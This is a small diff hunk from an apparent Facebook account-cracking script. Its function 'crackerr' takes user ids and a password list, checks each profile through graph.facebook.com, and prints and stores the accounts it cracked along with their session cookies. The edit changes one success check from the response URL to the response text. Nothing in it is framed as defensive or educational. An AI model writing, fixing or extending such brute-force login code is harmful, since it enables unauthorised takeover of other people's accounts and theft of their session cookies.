@@ -528,7 +528,7 @@ def crackerr(ids,passlist):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                     if "confirmemail.php" in response.url:
+                     if "confirmemail.php" in response.text:
                            print(f"{green}nvvv : {green}{coki}")
                            oks.append(user)
                            break
